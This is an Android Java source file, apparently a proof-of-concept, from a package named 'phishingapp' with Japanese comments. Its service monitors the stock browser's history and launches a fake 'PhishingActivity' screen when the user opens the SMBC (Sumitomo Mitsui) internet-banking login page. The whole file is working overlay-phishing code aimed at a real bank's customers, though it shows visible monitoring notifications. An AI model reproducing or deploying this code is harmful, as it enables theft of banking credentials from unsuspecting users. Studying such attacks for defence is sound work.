package net.virifi.android.phishingapp;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.provider.Browser;
import android.support.v4.app.NotificationCompat;
import android.widget.Toast;

public class HistoryObserverService extends Service {
	private HistoryObserver mHistoryObserver;
	public static boolean isRunning = false;
	
	// 標準ブラウザの履歴の変更通知を受け取るためのContentObserver
	private class HistoryObserver extends ContentObserver {
		private final ContentResolver mResolver;
		private int mLastId = -1;

		public HistoryObserver(Handler handler) {
			super(handler);
			mResolver = getContentResolver();
		}
		
		@Override
		public void onChange(boolean selfChange) {
			// 標準ブラウザの履歴を日付の降順で取得する
			Cursor c = mResolver.query(
					Browser.BOOKMARKS_URI,
					Browser.HISTORY_PROJECTION,
					null,
					null,
					Browser.HISTORY_PROJECTION[Browser.HISTORY_PROJECTION_DATE_INDEX] + " desc");
			if (!c.moveToFirst()) return;
			int id = c.getInt(Browser.HISTORY_PROJECTION_ID_INDEX);
			if (id != mLastId) {
				String url = c.getString(Browser.HISTORY_PROJECTION_URL_INDEX);
				Toast.makeText(getApplicationContext(), url, Toast.LENGTH_SHORT).show();
				// アクセス先が三井住友銀行のインターネットバンキングのログインページである場合、偽のページを表示する
				if (url.indexOf("https://direct.smbc.co.jp/aib/aibgsjsw") >= 0) {
					Intent intent = new Intent(getApplicationContext(), PhishingActivity.class);
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intent.putExtra("url", url);
					startActivity(intent);
				}
			}
			mLastId = id;
			c.close();
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate()
	{
		// ContentObserver#onChangeが実行されるスレッド
		HandlerThread thread = new HandlerThread("worker");
		thread.start();
		mHistoryObserver = new HistoryObserver(new Handler(thread.getLooper()));
		
		// 標準ブラウザのブックマーク・履歴を提供するContentProviderにContentObserverを登録する
		getContentResolver().registerContentObserver(Browser.BOOKMARKS_URI, true, mHistoryObserver);
		
		// サービス実行中は常に通知バーにアイコンを表示
		Intent notificationIntent = new Intent(this, MainActivity.class);
		//notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
		Notification notification = new NotificationCompat.Builder(this)
				.setContentTitle("監視中")
				.setContentText("標準ブラウザのアクセスサイトを監視中")
				.setContentIntent(pendingIntent)
				.setSmallIcon(R.drawable.ic_launcher)
				.build();
		startForeground(1, notification);		
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		if (isRunning) {
			Toast.makeText(this, "既に監視しています", Toast.LENGTH_LONG).show();
		} else {
			isRunning = true;
			Toast.makeText(this, "標準ブラウザのアクセス履歴の監視を開始しました", Toast.LENGTH_LONG).show();
		}
		return START_STICKY;
	}

	@Override
	public void onDestroy() {
		isRunning = false;
		getContentResolver().unregisterContentObserver(mHistoryObserver);
		Toast.makeText(this, "監視を停止しました", Toast.LENGTH_SHORT).show();
	}
}
